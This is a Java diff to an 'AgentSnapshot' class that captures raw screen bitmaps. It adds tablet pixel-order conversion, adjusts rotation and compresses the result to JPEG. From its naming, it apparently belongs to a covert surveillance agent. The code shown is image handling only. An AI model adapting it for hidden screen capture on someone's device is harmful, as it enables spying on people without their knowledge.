@@ -148,20 +148,63 @@ public class AgentSnapshot extends AgentBase {
 				int width, height;
 				final int orientation = display.getOrientation();
 
-				if (orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
-					width = display.getWidth();
-					height = display.getHeight();
+				int w = display.getWidth();
+				int h = display.getHeight();
+
+				boolean isTab = (w == 600 && h == 1024) || (w == 1024 && h == 600);
+
+				if (isTab) {
+					h = display.getWidth();
+					w = display.getHeight();
+				}
+
+				boolean useOrientation = true;
+				boolean useMatrix = true;
+
+				if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
+					width = w;
+					height = h;
 				} else {
-					height = display.getWidth();
-					width = display.getHeight();
+					height = w;
+					width = h;
 				}
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (go): w=" + width + " h=" + height) ;//$NON-NLS-1$ //$NON-NLS-2$
 				}
 
+				// 0: invertito blu e rosso
+				// 1: perdita info
+				// 2: invertito blu e verde
+				// no ARGB, no ABGR, no AGRB
 				byte[] raw = getRawBitmap();
-				// int[] pixels = new int[ width * height];
+				if (isTab) {
+					// sul tablet non e' ARGB ma ABGR.
+					byte[] newraw = new byte[raw.length / 2];
+					for (int i = 0; i < newraw.length; i++) {
+						switch (i % 4) {
+						case 0:
+							newraw[i] = raw[i + 2]; // A 3:+2
+							break;
+						case 1:
+							newraw[i] = raw[i]; // R 1:+2 2:+1
+							break;
+						case 2:
+							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
+							break;
+						case 3:
+							newraw[i] = raw[i]; // B 1:-2
+							break;
+						}
+						/*
+						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
+						 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
+						 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
+						 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
+						 * // B 1:-2
+						 */}
+					raw = newraw;
+				}
 
 				if (raw != null) {
 					Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
@@ -171,15 +214,21 @@ public class AgentSnapshot extends AgentBase {
 					buffer = null;
 					raw = null;
 
-					if (orientation != Surface.ROTATION_0) {
+					int rotateTab = 0;
+					if (isTab) {
+						rotateTab = -90;
+					}
+					if (useMatrix && orientation != Surface.ROTATION_0) {
 						final Matrix matrix = new Matrix();
 
 						if (orientation == Surface.ROTATION_90) {
-							matrix.setRotate(270);
+							matrix.setRotate(270 + rotateTab);
 						} else if (orientation == Surface.ROTATION_270) {
-							matrix.setRotate(90);
+							matrix.setRotate(90 + rotateTab);
 						} else if (orientation == Surface.ROTATION_180) {
-							matrix.setRotate(180);
+							matrix.setRotate(180 + rotateTab);
+						} else {
+							matrix.setRotate(rotateTab);
 						}
 
 						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
@@ -223,12 +272,13 @@ public class AgentSnapshot extends AgentBase {
 
 	private byte[] toJpeg(Bitmap bitmap) {
 
-		final ByteArrayOutputStream os = new ByteArrayOutputStream();
+		ByteArrayOutputStream os = new ByteArrayOutputStream();
 		bitmap.compress(Bitmap.CompressFormat.JPEG, SNAPSHOT_DEFAULT_JPEG_QUALITY, os);
 
 		final byte[] array = os.toByteArray();
 		try {
 			os.close();
+			os = null;
 
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
